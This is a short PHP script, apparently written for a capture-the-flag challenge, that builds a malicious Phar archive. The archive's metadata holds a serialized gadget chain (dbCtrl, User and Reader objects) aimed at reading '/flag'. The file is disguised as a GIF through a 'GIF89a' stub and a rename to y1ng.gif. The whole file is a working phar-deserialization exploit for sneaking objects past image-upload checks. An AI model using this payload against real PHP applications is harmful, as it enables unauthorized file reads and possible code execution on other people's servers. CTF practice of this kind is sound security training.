<?php
class User
{
	public $id;
	public $age=null;
	public $nickname=null;
	public $backup;
	public function __construct()
	{
		$this->nickname = new Reader();
		$this->backup = "/flag";
	}
}
class dbCtrl
{
	public $token;
	public function __construct()
	{
		$this->token = new User;
	}
}
Class Reader{
public $filename;
public $result;
}
$y1ng = new dbCtrl();
$phar = new Phar("web1.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($y1ng);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
@rename("web1.phar", "y1ng.gif");

?>
